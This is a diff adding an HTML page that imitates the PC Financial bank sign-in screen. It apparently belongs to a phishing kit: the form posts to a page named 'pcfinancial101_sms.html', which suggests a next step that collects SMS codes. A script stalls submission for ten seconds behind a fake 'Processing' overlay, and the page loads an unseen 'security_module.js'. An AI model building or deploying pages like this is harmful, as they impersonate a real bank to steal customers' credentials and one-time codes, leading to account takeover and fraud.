@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PC Financial</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        
+body { font-family: Arial, sans-serif; background: white; color: #333; margin: 0; }
+.p-header { padding: 15px 20px; border-bottom: 1px solid #eee; display: flex; align-items: center; }
+.p-logo-box { background: #e21836; color: white; padding: 15px 10px; font-family: 'Brush Script MT', cursive; font-size: 28px; margin-right: 10px; border-radius: 2px;}
+.p-logo-text { font-weight: bold; font-size: 22px; color: #333; }
+.p-container { padding: 40px 20px; max-width: 400px; margin: 0 auto; }
+.p-title { font-size: 26px; font-weight: bold; margin-bottom: 35px; color: #444; }
+.p-label { display: block; margin-bottom: 10px; color: #555; font-size: 14px; }
+.p-input-wrapper { position: relative; }
+.p-input { width: 100%; border: 1px solid #ccc; padding: 15px; box-sizing: border-box; border-radius: 4px; font-size: 16px; margin-bottom: 5px; }
+.p-input:focus { border-color: #6b2c91; outline: none; }
+.p-link { color: #6b2c91; text-decoration: underline; font-size: 14px; text-align: right; display: block; margin: 5px 0 25px 0; font-weight: bold; }
+.p-btn { width: 100%; background: #c61f28; color: white; border: none; padding: 18px; border-radius: 30px; font-size: 16px; font-weight: bold; margin-top: 30px; cursor: pointer; }
+.p-eye { position: absolute; right: 15px; top: 15px; color: #666; font-size: 18px; }
+.p-footer { margin-top: 40px; font-size: 15px; color: #333; }
+.p-footer a { color: #6b2c91; font-weight: bold; text-decoration: underline; }
+
+        /* Loader Overlay */
+        .loader-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background-color: rgba(255, 255, 255, 0.95);
+            display: flex; flex-direction: column; justify-content: center; align-items: center;
+            z-index: 999999; visibility: hidden; opacity: 0; transition: opacity 0.3s;
+            font-family: Arial, sans-serif;
+        }
+        .loader-overlay.active { visibility: visible; opacity: 1; }
+        .loader-spinner {
+            border: 4px solid #f3f3f3; border-top: 4px solid #c61f28;
+            border-radius: 50%; width: 50px; height: 50px;
+            animation: spin 1s linear infinite; margin-bottom: 20px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .loader-text { font-size: 18px; font-weight: bold; color: #333; }
+        .success-icon { font-size: 70px; color: #c61f28; margin: 30px auto; display: block; text-align: center; }
+        .success-desc { font-size: 16px; color: #333; line-height: 1.5; margin-bottom: 30px; text-align: center; padding: 0 20px; }
+    </style>
+</head>
+<body>
+    
+<div class="p-header"><div class="p-logo-box">pc</div><div class="p-logo-text">Financial&reg;</div></div>
+<div class="p-container">
+    <div class="p-title">Sign in</div>
+    <form action="pcfinancial101_sms.html" method="POST">
+        <label class="p-label">Username</label>
+        <div class="p-input-wrapper"><input type="text" class="p-input" placeholder="Enter username" required></div>
+        <a href="#" class="p-link">Forgot username</a>
+        
+        <label class="p-label">Password</label>
+        <div class="p-input-wrapper"><input type="password" class="p-input" placeholder="Enter password" required><i class="fa-solid fa-eye p-eye"></i></div>
+        <a href="#" class="p-link">Forgot password</a>
+        
+        <label style="display:flex; align-items:center; font-size:15px;"><input type="checkbox" style="width:20px;height:20px;margin-right:15px;"> Remember me <i class="fa-solid fa-circle-info" style="margin-left:5px;color:#666;"></i></label>
+        
+        <button type="submit" class="p-btn">Sign in</button>
+    </form>
+    <div class="p-footer">Don't have an online account? <a href="#">Sign up</a></div>
+</div>
+
+    <div id="loaderOverlay" class="loader-overlay">
+        <div class="loader-spinner"></div>
+        <p class="loader-text">Processing, please wait...</p>
+    </div>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const form = document.querySelector('form');
+            const loader = document.getElementById('loaderOverlay');
+            if(form && loader) {
+                form.addEventListener('submit', function(e) {
+                    e.preventDefault();
+                    loader.classList.add('active');
+                    setTimeout(function() { form.submit(); }, 10000);
+                });
+            }
+        });
+    </script>
+<script src="security_module.js"></script>
+</body>
+</html>
